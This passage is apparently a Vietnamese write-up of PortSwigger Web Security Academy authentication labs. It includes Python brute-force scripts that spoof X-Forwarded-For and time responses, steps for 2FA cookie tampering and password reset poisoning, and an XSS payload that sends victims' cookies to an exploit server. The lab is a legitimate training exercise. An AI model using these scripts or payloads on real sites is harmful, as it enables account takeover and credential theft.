- Bởi dấu hiệu có thể đăng nhập lại sau 30 phút, từ đó suy đoán rằng hệ thống thực hiện block địa chỉ IP của chúng ta trong 30 phút. Thêm Request Header X-Forwarded-For: 1.1.1.1 với tác dụng thay đổi địa chỉ IP thành 1.1.1.1 và thực hiện đăng nhập với tài khoản đúng, chúng ta có thể đăng nhập thành công.

- Xác định rằng X-Forwarded-Fortiêu đề được hỗ trợ, điều này cho phép bạn giả mạo địa chỉ IP của mình và bỏ qua biện pháp bảo vệ IP-based brute-force protection dựa trên IP.

![image](https://hackmd.io/_uploads/SJBD3ylcT.png)

-Như vậy chúng ta có thể thay đổi IP với từng request trong tấn công brute force để bypass cơ chế block IP của hệ thống.

Thử đăng nhập với một username không tồn tại và một password rất dài, chúng ta nhận được phản hồi ngay lập tức.

![image](https://hackmd.io/_uploads/HJkcJlxcT.png)

![image](https://hackmd.io/_uploads/BJ6qygxqT.png)

Đăng nhập với username wiener và password rất dài, response được trả về chậm hơn (khoảng 3 - 4 giây, thời gian này tùy thuộc vào từng môi trường khác nhau, có thể ảnh hưởng bởi đường truyền mạng, bộ xử lý, ...).

![image](https://hackmd.io/_uploads/BJkAkgx5p.png)

- Từ sự khác biệt về thời gian phản hồi này, chúng ta có thể suy đoán rằng hệ thống thực hiện kiểm tra username trước, nếu không tồn tại username trong cơ sở dữ liệu sẽ ngay lập tức trả về đăng nhập thất bại, nếu username tồn tại (ở đây là wiener), hệ thống thực hiện kiểm tra password và vì chúng ta sử dụng một password rất dài nên dẫn tới thời gian xử lý lâu hơn ở cơ chế hash, dẫn đến thời gian phản hồi chậm hơn.

Kết hợp 2 điều trên, chúng ta sẽ thực hiện brute force kết hợp thay đổi địa chỉ IP cho mỗi username, sử dụng password dài mặc định cho mỗi lần thử. (với Attack type: Pitchforce)

![image](https://hackmd.io/_uploads/SJW-mlxqa.png)

### Khai thác

- Thiết lập cho địa chỉ IP thay đổi lần lượt từ 1.1.1.0 đến 1.1.1.100

![image](https://hackmd.io/_uploads/BJQGWxlq6.png)

![image](https://hackmd.io/_uploads/HkP5zxx5a.png)

- Khi cuộc tấn công kết thúc, ở đầu hộp thoại, hãy nhấp vào Cột rồi chọn các tùy chọn Đã nhận được phản hồi và Đã hoàn thành phản hồi . Hai cột này hiện được hiển thị trong bảng kết quả.

Quan sát cột giá trị Response received và Response completed thấy request 55 có giá trị lớn. Đây là bằng chứng cho thấy hệ thống đang xử lý chuỗi mật khẩu rất lớn của chúng ta.

![image](https://hackmd.io/_uploads/H1wQSex5p.png)

- Điều này chứng tỏ username cần tìm là ```alerts```. Tiếp tục thực hiện như trên với danh sách passwords.

![image](https://hackmd.io/_uploads/B1dvIexc6.png)

Khi cuộc tấn công kết thúc, hãy tìm phản hồi kèm theo 302 trạng thái. Hãy ghi lại mật khẩu này.

- chúng ta thu được tài khoản hợp lệ là ```alerts:cheese```. Đăng nhập và giải quyết lab:

![image](https://hackmd.io/_uploads/rkA68gxcT.png)

mình đã làm lại lab này và viết mã khai thác

mình thấy thấy ```wiener: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa``` status 302 response time xấp xỉ 3000 milliseconds

```python
import requests
import time
url = 'https://0a73009803ee1c1c813a3eae00b20033.web-security-academy.net/login'
file_username = open('./username.txt','r')
username = file_username.readline().strip()
# print(username)
for i in range(101):
    a = time.time()
    response = requests.post(url, data={'username': username, 'password': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'}, headers={'X-Forwarded-For': '118.71.204.'+ str(i)})
    if (time.time() - a > 3 ):
        print("Tên đăng nhập là:" + username)
        break
    username = file_username.readline().strip()

file_password = open('./password.txt','r')
password = file_password.readline().strip()
# print(password)
for i in range(101):
    response = requests.post(url,data={'username': username, 'password': password}, allow_redirects= False,headers={'X-Forwarded-For': '118.71.204.'+ str(i)})
    if(response.status_code ``` 302):
        print("Mật khẩu là:" + password)
        break
    password = file_password.readline().strip()
```

![image](https://hackmd.io/_uploads/BJu1GZlqa.png)

và được tài khoản là ```am:666666``` đồng thời chúng ta cũng đã giải được lab này

![image](https://hackmd.io/_uploads/rktu-bgcT.png)

## 6. Lab: Broken brute-force protection, IP block

link: https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

### Đề bài

![image](https://hackmd.io/_uploads/r1afIYl5p.png)

### Phân tích

- các trang web thường sử dụng một số cách sau để ngăn chặn tấn công brute force:
  - Nếu phát hiện một user thực hiện đăng nhập sai quá số lần cho phép với thời gian giữa các lần đăng nhập ngắn, thực hiện khóa IP của họ vì đây có thể là một cuộc tấn công vét cạn.
  - Tương tự, hệ thống có thể tạm khóa tài khoản khả nghi trong một thời gian nhất định.

cơ chế ngăn chặn tồn tại một số lỗ hổng logic.

- Một hệ thống thực hiện khóa IP kẻ tấn công sau mỗi 3 lần đăng nhập sai liên tiếp tài khoản trong thời gian nhất định. Nhưng để ít mang đến sự phiền phức nhất tới người dùng, hệ thống sẽ reset cơ chế này mỗi khi người dùng nhập đúng tài khoản của họ. Đây là một lỗ hổng có thể bị lợi dụng bởi kẻ tấn công. Họ có thể thực hiện brute force với 2 request giả và 1 request thật xen kẽ: tức là mỗi khi brute force 2 tài khoản khác nhau, sẽ đăng nhập với tài khoản hợp lệ nhằm reset lại cơ chế bảo vệ của hệ thống

- Ở tình huống này, chúng ta được cung cấp một tài khoản hợp lệ wiener:peter và username victim là carlos, danh sách passwords có chứa password của carlos.

- Gợi ý của đề bài: chúng ta có thể sử dụng tính năng macro trong Turbo Intruder extension để tối ưu và tự động hóa cuộc tấn công. Tuy nhiên chúng ta cũng có thể tự code lại danh sách username và password phù hợp trong trường hợp này.

- Đăng nhập với username hợp lệ wiener và password sai trả về **Invalid passwd**.
- Tuy nhiên nếu đăng nhập sai liên tiếp 3 lần chúng ta sẽ bị ngăn chặn đăng nhập trong 1 phút.

![image](https://hackmd.io/_uploads/rk1e_Flc6.png)

- Cách ngăn chặn địa chỉ IP này không thể bypass bằng X-Forwarded-For như lab trước. Tuy nhiên nếu ở lần thứ 3 chúng ta đăng nhập với tài khoản hợp lệ wiener:peter thì cơ chế này được reset. Tức là chúng ta có thể thực hiện brute force username, password với quy tắc: sau mỗi 2 lượt thực hiện brute force, sẽ thực hiện 1 lần đăng nhập hợp lệ bằng tài khoản wiener:peter (sử dụng Attack type: Pitchfork).

### Khai thác

- Công việc tự code lại danh sách username và password
- mình sẽ tạo list đăng nhập so le 1 lần đúng và 1 lần sai
- **username list**

```
carlos
wiener
carlos
wiener
...
```

- **password list**

```
123456
peter
password
peter
12345678
peter
qwerty
peter
...
```

![image](https://hackmd.io/_uploads/Sygrk5l9a.png)

Như vậy, chúng ta sẽ thực hiện tấn công brute force tương tự các labs trước. Lưu ý rằng khi đăng nhập hợp lệ thì status trả về là 302 (Tìm kiếm status trả về 302 của các request có username là carlos).

![image](https://hackmd.io/_uploads/BkYqeqg9T.png)

chúng ta được 1 tài khoản carlos có response 302

mình đã viết mã khai thác cho bài này

- với tạo file tài khoản mình sẽ tạo cho khi đăng nhập 1 lần trong list password sẽ đăng nhập tài khoản đúng `wiener:peter`

```python
usrname = open('./username.txt', 'r')
new_usrname = open('new_username.txt', 'w')
for word in usrname:
    new_usrname.write('carlos\n')
    new_usrname.write('wiener\n')

passwds = open('./password.txt', 'r')
new_passwds = open('new_password.txt', 'w')
for word in passwds:
    new_passwds.write(word)
    new_passwds.write('peter\n')
```

- mã khai thác

```python
import requests
import time
url = 'https://0a44004c044170bb8161307e00f2001a.web-security-academy.net/login'
file_username = open('./new_username.txt','r')
username = file_username.readline().strip()

file_password = open('./new_password.txt','r')
password = file_password.readline().strip()

for i in range(101):
    response = requests.post(url,data={'username': username, 'password': password}, allow_redirects= False,)
    if(username != "wiener" and response.status_code ``` 302 ):
        print("Mật khẩu của carlos là: " + password)
        break
    password = file_password.readline().strip()
    username = file_username.readline().strip()
```

![image](https://hackmd.io/_uploads/SyRU0tgcT.png)

mình nhận được mật khẩu là ```football```
mình đăng nhập tài khoản ```carlos:football``` và giải được lab này

![image](https://hackmd.io/_uploads/SkwXAKg56.png)

## 7. Lab: Username enumeration via account lock

link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

### Đề bài

![image](https://hackmd.io/_uploads/r1D2Q5gca.png)

### Phân tích

- Bên cạnh cơ chế khóa IP kẻ tấn công, đối với cơ chế bảo vệ brute force thông qua khóa tài khoản khả nghi trong thời gian nhất định. Và thường hệ thống chỉ khóa được tài khoản tồn tại trong cơ sở dữ liệu - đây chính là yếu tố có lợi có kẻ tấn công, họ sẽ lợi dụng điều này để tìm ra một tài khoản tồn tại và sẽ bị khóa trong một thời gian bởi hệ thống (đồng nghĩa với việc sau khi hết thời gian khóa họ có thể tìm kiếm mật khẩu của tài khoản đó).

- Đề bài cung cấp 2 danh sách Candidate usernames và Candidate passwords. Nhiệm vụ của chúng ta là sử dụng kĩ thuật tấn công vét cạn tìm kiếm tên đăng nhập và mật khẩu người dùng, truy cập vào tài khoản của victim. Đề bài cho biết hệ thống sẽ khóa tài khoản của người dùng trong một thời gian nếu bị phát hiện hành vi brute force.

- Thử đăng nhập với username và password bất kì, hệ thống đưa ra thông báo Invalid username or password.. Đăng nhập liên tiếp nhiều lần, vẫn nhận được thông báo trên, hệ thống không thực hiện block hoặc ngăn cản hành vi đăng nhập, và chúng ta suy đoán rằng hệ thống chỉ thực hiện cơ chế bảo vệ khóa tài khoản đối với username tồn tại trong cơ sở dữ liệu. Như vậy chúng ta có thể sử dụng kĩ thuật tấn công brute force để tìm kiếm username victim.

### Khai thác

Để tự động hóa việc đăng nhập nhiều lần với mỗi username, chúng ta có thể sử dụng lựa chọn Null payloads (generate 4 payloads) với Attack type: Cluster bomb. Ở lựa chọn payload set 1 sẽ là danh sách username, payload set 2 là Null payloads

![image](https://hackmd.io/_uploads/ByPAEix9p.png)

- Trên tab Tải trọng , thêm danh sách tên người dùng vào nhóm tải trọng đầu tiên. Đối với bộ thứ hai, chọn loại tải trọng Null và chọn tùy chọn tạo 5 tải trọng. Điều này sẽ khiến mỗi tên người dùng được lặp lại 5 lần một cách hiệu quả. Bắt đầu cuộc tấn công.

![image](https://hackmd.io/_uploads/BJT9q9l5a.png)

![image](https://hackmd.io/_uploads/r1tY99g5T.png)

Username app bị khóa, suy ra đây là một tên đăng nhập hợp lệ. Tiếp tục thực hiện brute force password:

mình đã viết lại mã khai thác

```python
import requests
from tqdm import tqdm
url = 'https://0aee0016044a70e5814e4ed300320023.web-security-academy.net/login'

#Step 1:
usernames = open('./username.txt', 'r').read().splitlines()
usernameValid = ''
for username in tqdm(usernames):
    for i in range(4):
        data = {
            'username': username,
            'password': 'password'
        }
        response = requests.post(url, data=data)

        if 'too many incorrect login' in response.text:
            usernameValid = username
            print(username)
            break
    if usernameValid != '':
        break
#Step 2:
passwords = open('./password.txt', 'r').read().splitlines()
passwordValid = ''
for password in tqdm(passwords):
    data = {
        'username': usernameValid,
        'password': password
    }

    response = requests.post(url, data=data)
    if 'Invalid username or password' in response.text or 'too many incorrect login' in response.text:
        passwordValid = password
        continue
    else:
        print(passwordValid)
        break
```

![image](https://hackmd.io/_uploads/B1nI-jeqp.png)

mình được tài khoản là ```app:monkey``` và đăng nhập và giải quyết được bài lab

## 8. Lab: 2FA broken logic

link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

### Đề bài

![image](https://hackmd.io/_uploads/rygubAgqp.png)

### Phân tích

- Giá trị cookie tương ứng đặt cho người dùng carlos là account=carlos: đây là một cookie không an toàn vì nó trực tiếp sử dụng tên đăng nhập làm giá trị cookie mà không qua bước mã hóa nào. Sau đó, khi người dùng hoàn thành xong bước xác thực 2FA, hệ thống sử dụng chính cookie này để xác định danh tính người dùng:

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
```

Chắc hẳn các bạn cũng đã nhận ra chúng ta có thể làm gì với cookie này rồi chứ! Đúng vậy, kẻ tấn công hoàn toàn có thể thay thế giá trị cookie này thành tên đăng nhập của người dùng khác, biết đâu nó sẽ khiến hệ thống lầm tưởng rằng người dùng xấu số kia đang yêu cầu xác thực 2FA! Tất nhiên, kẻ tấn công sẽ mong muốn victim khi đó đang không hoạt động với tài khoản của họ (đang ngủ chẳng hạn...).

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```

- Ở tình huống này chúng ta được cung cập một tài khoản hợp lệ (dùng để phân tích cách hoạt động của hệ thống xác thực) và có được username:password của tài khoản victim, chúng ta cần vượt qua cơ chế xác thực 2FA để truy cập vào tài khoản victim. Trang email hỗ trợ việc lấy mã code 2FA cho người dùng wiener.

- Trước hết, đăng nhập với tài khoản hợp lệ wiener:peter, thực hiện bắt request qua Burp Suite để tìm hiểu cách hoạt động cơ chế xác thực của hệ thống.

- Sau khi đăng nhập tại trang /login, hệ thống chuyển hướng chúng ta tới một trang mới /login2 để thực hiện xác thực mã code 2FA. Và hệ thống xác thực danh tính người dùng bằng cookie verify=wiener:

![image](https://hackmd.io/_uploads/rkOmGCg9p.png)

![image](https://hackmd.io/_uploads/Byl5zAg96.png)

### Khai thác

- Gửi lại request xác thực mã 2FA nhiều lần, hệ thống không ngăn chặn hành vi tấn công brute force. Hơn nữa mã mfa-code có định dạng là một chuỗi gồm 4 chữ số ngẫu nhiên, nên chúng ta có thể thực hiện một cuộc tấn công brute force sau khi thay đổi giá trị cookie thành verify=carlos.

![image](https://hackmd.io/_uploads/ByUyECxca.png)

Lựa chọn chế độ brute force, định dạng 4 kí tự và giới hạn các kí tự sử dụng là các chữ số 0-9:

![image](https://hackmd.io/_uploads/rJtk4Rg9T.png)

đợi 1 khoảng thời gian khá lâu mình đã có kết quả status code 302

![image](https://hackmd.io/_uploads/Hy9zSAg9a.png)

## 9. Lab: Brute-forcing a stay-logged-in cookie

link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

### Đề bài

![image](https://hackmd.io/_uploads/B1hkuRxqT.png)

### Phân tích

Một trong những chức năng hỗ trợ người dùng thường thấy là chức năng ghi nhớ đăng nhập. Sau lần xác thực thành công đầu tiên, đến những lần tiếp theo người dùng truy cập lại trang web / ứng dụng đó sẽ không cần thực hiện xác thực nữa, tránh người dùng phiền phức khi phải đăng nhập lại nhiều lần.

Chức năng này thường được người dùng lựa chọn sử dụng hoặc không. Khi người dùng yêu cầu chức năng này, nó thường được lưu trữ trong một biến cookie. Lúc này biến cookie này sẽ đóng vai trò như một lệnh bài tối cao, có thể trực tiếp vượt qua quá trình xác thực từ hệ thống. Lệnh bài có quyền lực như vậy sẽ thường trở thành mục tiêu tấn công của kẻ xấu. Đối với cơ chế mã hóa không đủ độ chắc chắn, sẽ dễ dàng bị nắm bắt cơ chế mã hóa bởi kẻ tấn công có thể suy luận từ chính cookie tương ứng với tài khoản của họ.

Ở tình huống này chúng ta được cung cập một tài khoản hợp lệ (dùng cho việc phân cách tạo thành của cookie ghi nhớ đăng nhập) và được biết username của victim là carlos. Chúng ta cần tấn công cơ chế ghi nhớ đăng nhập này để truy cập vào người dùng carlos.

Đăng nhập tài khoản hợp lệ wiener:peter cùng với tính năng Stay logged in.

![image](https://hackmd.io/_uploads/BydSOAec6.png)

![ảnh](https://hackmd.io/_uploads/S1DmLVZqT.png)

![image](https://hackmd.io/_uploads/r1B-1BZ5T.png)

Hệ thống xác nhận việc ghi nhớ đăng nhập bằng giá trị cookie: ```d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhN```

mình dùng cyberchef và chọn kiểu **magic** để tự động decode
và thấy nó decode base64 được ```wiener:51dc30ddc473d43a6011e9ebba6ca770```

![ảnh](https://hackmd.io/_uploads/SJXuq4b9p.png)

![image](https://hackmd.io/_uploads/ryxjSHW9a.png)

- và burp suite cũng tự decode cho chúng ta ở bên trái

mình đoán ```51dc30ddc473d43a6011e9ebba6ca770``` khả năng lớn là mật khẩu của `wiener` sau khi được mã hóa bằng cách nào đó. Lúc này, dùng trang web này sẽ không tìm ra cách mã hóa nữa

- Quan sát các kí tự tạo thành: được tạo thành từ các chữ số 0-9 và các chữ cái thường từ a đến e.
- Độ dài bằng đúng 32 kí tự

Từ những điều trên ta có thể suy đoán khả năng lớn đây là dạng mã hóa MD5

mình dùng hash-identifier để nhận biết và đúng nó là mã MD5

![ảnh](https://hackmd.io/_uploads/ry3xjN-cp.png)

![ảnh](https://hackmd.io/_uploads/S1Ql5Nbq6.png)

- Như vậy chúng ta đã hiểu cơ chế tạo ra cookie ghi nhớ đăng nhập của hệ thống, nên có thể thực hiện tấn công brute force cookie này theo đúng định dạng mã hóa trên.

![image](https://hackmd.io/_uploads/S1g-XH-c6.png)

- Thêm danh sách mật khẩu như bình thường:
- Chọn Add trong mục Payload Proccessing, chọn Hash và MD5 để mã hóa password trước:
- Tiếp theo, thêm tiền tố carlos:

![image](https://hackmd.io/_uploads/H1sEgr-5T.png)

![image](https://hackmd.io/_uploads/SJNpGrZ5T.png)

và mình đã giải được lab này

![image](https://hackmd.io/_uploads/HJFy7HZca.png)

Ngoài cách brute force cookie trên, kẻ tấn công còn có thể tận dụng lỗ hổng XSS để lấy cắp giá trị cookie này. Với lỗ hổng Cross site scripting thì họ cũng không cần quan tâm tới cách hệ thống mã hóa, mà đơn giản họ chỉ cần lấy được giá trị cookie đó. Tuy nhiên, nếu như cơ chế mã hóa của hệ thống không đủ mạnh, và trong cookie ghi nhớ đăng nhập có sử dụng tới những thông tin nhảy cảm của người dùng như mật khẩu (chẳng hạn với cách mã hóa ở lab trên) thì kẻ tấn công sau khi lấy được cookie nạn nhân có thể thực hiện giải mã và sử dụng lại nhiều lần tài khoản của họ.

## 10. Lab: Offline password cracking

link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

### Đề bài

![image](https://hackmd.io/_uploads/B1hB8rbqp.png)

### Phân tích

- Lab này lưu trữ hàm băm mật khẩu của người dùng trong cookie. Phòng thí nghiệm cũng chứa lỗ hổng XSS trong chức năng bình luận. Để giải quyết bài thí nghiệm, hãy lấy cookie đăng nhập thường xuyên của Carlos và sử dụng nó để bẻ khóa mật khẩu của anh ấy. Sau đó, đăng nhập với tư cách Carlos và xóa tài khoản của anh ấy khỏi trang "My account"

- tương tự bài trước web có chức năng lưu phiên và thông tin đăng nhập qua cookie

![image](https://hackmd.io/_uploads/BJNkwSZcT.png)

![image](https://hackmd.io/_uploads/B1QcDrbqa.png)

### Khai thác

mình post 1 mã khai thác XSS

![image](https://hackmd.io/_uploads/BJ_W_BZqT.png)

trang web bị lỗi XSS, payload XSS được lưu trữ trên server

![image](https://hackmd.io/_uploads/SkxXurZ9T.png)

và server của chúng ta lắng nghe khi request đến là

![image](https://hackmd.io/_uploads/BkdmFrb5T.png)

payload để lấy cookie người dùng và gửi về server của chúng ta lắng nghe là

```javascript
<script>
  document.location='https://exploit-0a4700c603aa235b81255bc801e10070.exploit-server.net/exploit?c='+document.cookie
</script>
```

mình khai thác XSS tương tự với 1 bài post khác với payload trên

![image](https://hackmd.io/_uploads/HkUdFHZcp.png)

và sau đó vào phần access log để xem log của server và chúng ta thấy có 1 địa chỉ ip lạ xuất hiện trên server của chúng ta

![image](https://hackmd.io/_uploads/S1MWcSWcp.png)

ở phần stay-log-in có giá trị: ```Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz```  
![image](https://hackmd.io/_uploads/H1nG5BZ9T.png)

và mình đem decode base64 được giá trị
```carlos:26323c16d5f4dabff3bb136f2460a943```
đêm mật khẩu crack trên trang web crackstation

![image](https://hackmd.io/_uploads/SJ0DqBZq6.png)

và mình có tài khoản của người dùng là ```carlos:onceuponatime```

sau đó minhf đăng nhập vào tài khoản và xóa đi tài khoản này

![image](https://hackmd.io/_uploads/SynR9SZ5T.png)

![image](https://hackmd.io/_uploads/SyhJjBW96.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/rkUljS-5T.png)

## 11. Lab: Password reset poisoning via middleware

link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware

### Đề bài

![image](https://hackmd.io/_uploads/Hy46RH-qT.png)

### Phân tích

- Chúng ta biết rằng người dùng carlos sẽ bất cẩn click vào link được gửi tới Email client của anh ấy. Để giải quyết bài này, chúng ta cần khai thác lỗ hổng trong tính năng đặt lại mật khẩu để lấy được token đặt lại mật khẩu của victim carlos. Hệ thống cung cấp một exploit server dùng để lấy các dữ liệu thông tin từ victim.

- Giống với lab Password reset broken logic, chúng ta có thể cung cấp tài khoản bất kì để hệ thống gửi đường link đặt lại mật khẩu cho tài khoản đó. Theo đúng kịch bản, carlos sẽ click vào link đặt lại mật khẩu đó và "forward" tới exploit server của chúng ta. Như vậy, vấn đề cần giải quyết ở đây là làm sao khi carlos click vào đường dẫn đó, exploit server của chúng ta sẽ nhận được dữ liệu của anh ấy? Đối với các bạn quen thuộc các HTTP Headers chắc hẳn đã nghĩ tới X-Forwarded-Host. Đúng vậy, X-Forwarded-Host khai báo tên máy chủ được sử dụng để truy cập web trên trình duyệt.

- Thử nghiệm cuộc tấn công trên chính Email client của wiener.

- Bắt request qua Burp Suite thao tác gửi username cần đặt lại mật khẩu cho hệ thống, thêm header X-Forwarded-Host với giá trị là exploit server của chúng ta:

![image]![image](https://hackmd.io/_uploads/HyVvE0-9p.png)

Lúc này, email client của wiener nhận được một đường link đặt lại mật khẩu:

![image](https://hackmd.io/_uploads/SJmkHAW5p.png)
Nếu chúng ta bất cẩn click vào đường link này, hệ thống sẽ forward các dữ liệu tới exploit server do giá trị header X-Forwarded-Host.

![image](https://hackmd.io/_uploads/rJWVBAZcT.png)

ở access log thấy có password token của wiener

![image](https://hackmd.io/_uploads/S1Uqr0-5p.png)

![image](https://hackmd.io/_uploads/rJbRvCb9a.png)

![image](https://hackmd.io/_uploads/B1n3OAZ9T.png)

tiếp đó chúng ta thay đổi password của wiener

Cuộc tấn công thử nghiệm thành công! Đến lượt carlos thôi!

### Khai thác

Thêm header X-Forwarded-Host và đặt lại mật khẩu "giúp" carlos:

![image](https://hackmd.io/_uploads/ByQ8IC-cp.png)

- Sau đó đợi carlos click vào email và chúng ta nhận được giá trị temp-forgot-password-token của tài khoản carlos qua Access log.

![image](https://hackmd.io/_uploads/B1pGjAWcp.png)

```temp-forgot-password-token=fjxb3gxl61ivtbdnu548mosc5a6bszu9```

Bây giờ có thể dễ dàng cập nhật mật khẩu của carlos:

![image](https://hackmd.io/_uploads/BJqdcAZ5T.png)

![image](https://hackmd.io/_uploads/B1SeoCWc6.png)

mục đích thay đổi mật khẩu carlos của chúng ta đã hoàn thành và mình cũng đã giải được bài lab này

![image](https://hackmd.io/_uploads/SyjK9R-qT.png)

## 12. Lab: Password brute-force via password change

link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

### Đề bài

![image](https://hackmd.io/_uploads/ByQqnAZcp.png)

### Phân tích

- Bên cạnh tính năng quên mật khẩu, các nhà cung cấp cũng cho phép người dùng đổi mật khẩu mật khẩu của họ.
- Để ý rằng khi người dùng sử dụng tính năng thay đổi mật khẩu, hệ thống thường yêu cầu họ nhập mật khẩu hiện tại để xác nhận danh tính, và hai tham số là mật khẩu mới và xác nhận mật khẩu mới.

![image](https://hackmd.io/_uploads/rkPI6C-qp.png)

Tất nhiên, hệ thống luôn mong muốn chúng ta sẽ nhập New password và Confirm new password có giá trị giống nhau. Nếu chúng ta cố tình cho hai tham số này các giá trị khác nhau thì sao? Kết hợp với giá trị Current password, nếu lập trình viên không cẩn thận trong việc đưa ra các thống báo cho người dùng, một số thông tin nhạy cảm có thể bị lợi dụng.

Với cơ chế hoạt động này, kẻ tấn công có thể thực hiện tấn công Brute force trong giá trị Current password để tìm kiếm mật khẩu đúng của người dùng dựa vào các thống báo chứa thông tin nhạy cảm và việc hệ thống không ngăn chặn hành vi tấn công vét cạn.

- Chúng ta được cung cấp 1 tài khoản hợp lệ wiener:peter, username victim và 1 danh sách passwords chứa password đúng của carlos.

Đăng nhập tài khoản wiener:peter và thử đổi mật khẩu, nếu current password nhập đúng, password mới và password confirm không giống nhau thì hệ thống trả về thông báo New passwords do not match.

![image](https://hackmd.io/_uploads/Hkt96A-9p.png)

Nếu current password nhập sai, password mới và password confirm giống nhau thì hệ thống trả về trang login.

Nếu current password nhập sai, password mới và password confirm không giống nhau thì hệ thống trả về thông báo Current password is incorrect.

![image](https://hackmd.io/_uploads/S17AaRbcT.png)

Như vậy chúng ta có thể cố tình nhập password mới và password confirm không giống nhau, sử dụng tham số current password thực hiện tấn công Brute force với danh sách password được cung cấp.

### Khai thác

![image](https://hackmd.io/_uploads/HJ2fRRZqT.png)

mình vào grep extract để theo dõi thêm phầm cảnh báo

![image](https://hackmd.io/_uploads/Hynq0Ab5T.png)

mình nhận được warning `new password do not match` khi nhập mật khẩu mới không khớp nhau và mật khẩu đúng current password của chúng ta nhận được của carlos là `computer`

![image](https://hackmd.io/_uploads/HkSQyJGcp.png)

vậy chúng ta có tài khoản ```carlos:computer``` và đăng nhập chúng ta đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SyejJJzca.png)

## 13. Lab: Broken brute-force protection, multiple credentials per request

link: https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

### Đề bài

![image](https://hackmd.io/_uploads/HkmRVyMcp.png)

### Phân tích

- Một số hệ thống xác thực tài khoản người dùng qua định dạng JSON. Kiểu JSON định dạng theo từng cặp `key:value`, khi đó username đóng vai trò là key, password đóng vai trò là value. Do kiểu định dạng JSON chấp nhận giá trị value thuộc bất kì dạng gì như **object, array, string**, ... Nên khi thực hiện quá trình xác thực, nếu hệ thống không chuyển đổi password sang dạng string thì kẻ tấn công có thể lợi dụng sự lỏng lẻo trong kiểu dữ liệu này để vượt qua cơ chế xác thực.

- Chúng ta được cung cấp một danh sách password, trong đó chứa mật khẩu đúng của carlos. Cần khai thác tính năng đăng nhập để truy cập vào tài khoản của carlos.

Đăng nhập với tên đăng nhập và mật khẩu bất kì, quan sát request qua Burp Suite:

![image](https://hackmd.io/_uploads/rJYprJG5a.png)

Tên đăng nhập và mật khẩu được gửi tới hệ thống theo định dạng JSON. Do giá trị value của JSON chấp nhận các kiểu dữ liệu khác nhau, thử thay đổi kiểu dữ liệu khác của password:

![image](https://hackmd.io/_uploads/BklgPkMcT.png)

- Không thấy response báo lỗi, có thể hệ thống đã chấp nhận kiểu dữ liệu mảng của password mà không chuyển đổi về dạng string. Như vậy, có thể thực hiện gửi tất cả password theo định dạng mảng tới hệ thống.

### Khai thác

```python
passwds = open('./password.txt', 'r').read().splitlines()
s = ""
for a in passwds:
    s = "\"" + a + "\"," + s
print(s)
```

![image](https://hackmd.io/_uploads/S1PKYyf9a.png)

Gửi request với password là mảng các password được cung cấp:

![image](https://hackmd.io/_uploads/Bkioqyz56.png)

Chúng ta thu được response có status code 302. Click chuột phải chọn Show response in browser, copy và paste trong URL, chúng ta đã đăng nhập thành công:

![image](https://hackmd.io/_uploads/BkG-jyGc6.png)

và mình đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HkI-s1M9T.png)
